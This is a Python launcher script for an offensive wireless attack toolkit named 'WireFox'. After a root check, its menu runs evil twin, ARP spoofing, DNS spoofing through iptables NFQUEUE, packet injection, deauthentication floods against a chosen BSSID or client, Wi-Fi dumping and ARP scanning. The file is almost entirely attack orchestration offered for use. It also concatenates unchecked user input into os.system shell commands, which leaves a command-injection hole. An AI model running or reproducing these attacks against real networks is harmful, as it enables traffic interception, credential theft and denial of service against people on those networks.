import sys
import getpass

username = getpass.getuser()
if username != "root":
    print(u"\u001b[37myou have no root access but you think are in progress! :D")
    sys.exit(1)

del username

try:
    from scapy.all import *
except:
    print("Scapy is not installed!, please run <python3 install.py>")
    sys.exit(2)

try:
    import netfilterqueue
except:
    print("Netfilterqueue is not installed!, please run <python3 install.py>")
    sys.exit(2)

import os
from attackmodules import evil_twin
from attackmodules import DnsSpoofing
from attackmodules import PacketInject
from attackmodules import ArpSpoof
from attackmodules import Deauth


def logo():
    os.system("clear")
    print(u"""

\u001b[32;1mdb   d8b   db d888888b d8888b. d88888b d88888b  .d88b.  db    db
88   I8I   88   `88'   88  `8D 88'     88'     .8P  Y8. `8b  d8'
88   I8I   88    88    88oobY' 88ooooo 88ooo   88    88  `8bd8'
Y8   I8I   88    88    88`8b   88~~~~~ 88~~~   88    88  .dPYb.
`8b d8'8b d8'   .88.   88 `88. 88.     88      `8b  d8' .8P  Y8.
 `8b8' `8d8'  Y888888P 88   YD Y88888P YP       `Y88P'  YP    YP

\u001b[4m  01010111 01101001 01110010 01100101 01000110 01101111 01111000  """)
    print("\n\n")


def wirefox():
    logo()
    print(u"""\u001b[4m\u001b[37;1m                   {1}--EvilTwin
                   {2}--ArpSpoofing
                   {3}--DnsSpoofing
                   {4}--PacketInjection
                   {5}--Deauth
                   {6}--DumpWifi
                   {7}--ArpScan\u001b[0m


          """)

    option = input(u"\u001b[33;1m[WireFox]-> ")
    if option == "1":
        iface = input("[^] (monitor interface name)-> ")
        evil_twin.start(iface)

    elif option == "2":
        target_ip = input(u"\u001b[33;1m[^] (Target IP)-> ")
        print(u"\u001b[32;1m[*] Set {0} Target IP".format(target_ip))
        target2_ip = input(u"\u001b[33;1m[^] (Target2 IP)-> ")
        print(u"\u001b[32;1m[*] Set {0} Target2 IP".format(target2_ip))
        try:
            ArpSpoof.start(target_ip, target2_ip)
        except KeyboardInterrupt:
            try:
                ArpSpoof.stop(target_ip, target2_ip)
            except:
                print(u"\u001b[31;1m[!] Not Restoring!!!")
                sys.exit(2)
        except:
            input(u"\u001b[31;1m[!] IP address not found![Try again!]")
            wirefox()


    elif option == "3":
        hosts = input(u"\u001b[33;1m[^] (All dns spoofing or just Config hosts? A/C) # ")
        if hosts == "A" or hosts == "a" or hosts == "all" or hosts == "All":
            ip = input(u"\n\u001b[33;1m[^] (IP For Spoof)-> ")
            print(u"\u001b[32m")
            os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
            DnsSpoofing.start(ip)
        elif hosts == "C" or hosts == "c" or hosts == "Config" or hosts == "config":
            os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
            try:
                DnsSpoofing.start()
            except:
                os.system("iptables --flush")
                sys.exit(1)

    elif option == "4":
        try:
            file = input(u"\u001b[33;1m[^] (File address for inject)-> ")
            os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

            PacketInject.start(file)

        except KeyboardInterrupt:
            os.system("iptables --flush")
            sys.exit(1)
        except FileNotFoundError:
            print(u"\u001b[31m[*] File Not Found!")
            os.system("iptables --flush")
            sys.exit(1)

    elif option == "5":
        iface = input(u"\u001b[33;1m[^] (Monitor interface)-> ")
        if iface == "" or iface == " ":
            print("E...r")
            sys.exit()
        print(u"\u001b[32;1m[*] Set {0} interface".format(iface))
        bssid = input(u"\u001b[33;1m[^] (Wifi Bssid)-> ")
        if bssid == "" or bssid == " ":
            print("E...r")
            sys.exit()
        print(u"\u001b[32;1m[*] Set {0} Wifi Bssid!".format(bssid))
        client = input(u"\u001b[33;1m[^] (Client Mac[ff:ff:ff:ff:ff:ff])-> ")
        if client == "" or client == " ":
            client = "ff:ff:ff:ff:ff:ff"
        print(u"\u001b[32;1m[*] Set {0} Client Mac!".format(client))
        channel = input(u"\u001b[33;1m[^] (Wifi Channel)-> ")
        if channel == "" or channel == " ":
            print("E...r")
            sys.exit()

        os.system("iw dev wlan0mon set channel " + channel)
        print(u"\u001b[34m")

        Deauth.attack(client, bssid, iface)


    elif option == "6":
        iface = input(u"\u001b[33;1m[^] (Monitor interface)-> ")
        if iface == "" or iface == " ":
            print("E...r")
            sys.exit()
        print()
        os.system("python3 moduless/dump.py " + iface)

    elif option == "7":
        ip = input(u"\u001b[33;1m[^] (IP/IPRange)-> ")
        if ip == "" or ip == " ":
            print("E...r")
            sys.exit()
        print()
        os.system("python3 attackmodules/ArpScan.py " + ip)

    else:
        wirefox()

wirefox()
